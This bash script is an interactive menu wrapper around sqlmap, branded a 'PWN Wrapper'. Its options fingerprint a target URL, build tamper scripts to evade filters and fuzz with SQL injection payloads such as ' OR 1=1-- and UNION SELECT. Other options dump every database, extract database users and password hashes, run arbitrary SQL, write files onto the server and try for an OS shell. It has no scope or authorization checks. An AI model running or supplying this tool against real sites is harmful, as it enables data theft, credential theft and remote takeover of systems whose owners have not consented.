#!/bin/bash

GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
NC="\e[0m"

# Banner
sqlmap_banner() {
    clear
    echo -e "${YELLOW}"
    echo "╔═════════════════════════════════════════════════╗"
    echo "          SQLmap PWN Wrapper 🔥 by LazySuzann       "
    echo "╚═════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# 1) Fingerprint
fingerprint_target() {
    read -p "Enter target URL: " target
    echo -e "${GREEN}Running fingerprint...${NC}"
    sqlmap -u "$target" --fingerprint
}

# 2) Run basic scan
basic_sqlmap_scan() {
    read -p "Enter target URL: " target
    read -p "Any extra sqlmap options (or leave blank): " extra
    sqlmap -u "$target" $extra
}

# 3) Create custom tamper
create_custom_tamper() {
    echo -e "${YELLOW}Creating custom tamper script...${NC}"
    read -p "Regex or string to replace: " search
    read -p "Replacement string: " replace

    cat > custom_tamper.py <<EOF
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    if payload:
        payload = payload.replace("$search", "$replace")
    return payload
EOF

    sed -i "s|\$search|${search}|g" custom_tamper.py
    sed -i "s|\$replace|${replace}|g" custom_tamper.py

    echo -e "${GREEN}Custom tamper script saved as custom_tamper.py${NC}"
}

# 4) Run with custom tamper + fuzz payloads
run_sqlmap_with_tamper_fuzz() {
    read -p "Enter target URL: " target
    if [[ -f custom_tamper.py ]]; then
        tamper="--tamper=custom_tamper.py"
    else
        tamper=""
    fi

    # Optional fuzz payloads
    read -p "Fuzz payloads? (y/n): " choice
    if [[ "$choice" == "y" ]]; then
        payloads=(" OR 1=1--"
                  "' UNION SELECT NULL,NULL,NULL --"
                  "' AND SLEEP(5) --"
                  "' OR 'a'='a"
                  "' AND EXISTS(SELECT * FROM users) --")
        for payload in "${payloads[@]}"; do
            echo -e "${YELLOW}Testing payload: $payload${NC}"
            sqlmap -u "$target$payload" $tamper --batch
        done
    else
        sqlmap -u "$target" $tamper --batch
    fi
}

# 5) Advanced dump options
advanced_sqlmap() {
    read -p "Enter target URL: " target
    echo -e "${YELLOW}Choose advanced command:${NC}"
    echo "1) Dump all databases"
    echo "2) Dump specific table"
    echo "3) List DB users & passwords"
    echo "4) Run custom SQL query"
    read -p "Choice: " advopt

    case $advopt in
        1) sqlmap -u "$target" --batch --dump-all ;;
        2)
            read -p "Database name: " db
            read -p "Table name: " table
            sqlmap -u "$target" -D "$db" -T "$table" --dump
            ;;
        3) sqlmap -u "$target" --batch --users --passwords ;;
        4)
            read -p "SQL query to run: " query
            sqlmap -u "$target" --sql-query="$query"
            ;;
        *) echo -e "${RED}Invalid option.${NC}" ;;
    esac
}

# 6) Upload file
upload_file_sqlmap() {
    read -p "Enter target URL: " target
    read -p "Path to local file to upload: " local
    read -p "Destination path on server (absolute path): " remote
    sqlmap -u "$target" --file-write="$local" --file-dest="$remote"
}

# 7) OS Shell
try_os_shell() {
    read -p "Enter target URL: " target
    sqlmap -u "$target" --os-shell
}

sqlmap_wrapper_menu() {
    sqlmap_banner
    echo "1) Fingerprint Target"
    echo "2) Run SQLmap basic scan"
    echo "3) Create/Enable Custom Tamper"
    echo "4) Run SQLmap with custom tamper + fuzz payloads"
    echo "5) Run SQLmap with advanced dump commands"
    echo "6) Upload a file if vulnerable"
    echo "7) Check for OS Shell"
    echo "8) Return to main menu"
    echo

    read -p "Choose an option: " opt
    case $opt in
        1) fingerprint_target ;;
        2) basic_sqlmap_scan ;;
        3) create_custom_tamper ;;
        4) run_sqlmap_with_tamper_fuzz ;;
        5) advanced_sqlmap ;;
        6) upload_file_sqlmap ;;
        7) try_os_shell ;;
        8) bash LazySuzann.sh ;;
        *) echo -e "${RED}Invalid option.${NC}" ;;
    esac

    echo
    read -p "Press Enter to continue..." _
    sqlmap_wrapper_menu
}

sqlmap_wrapper_menu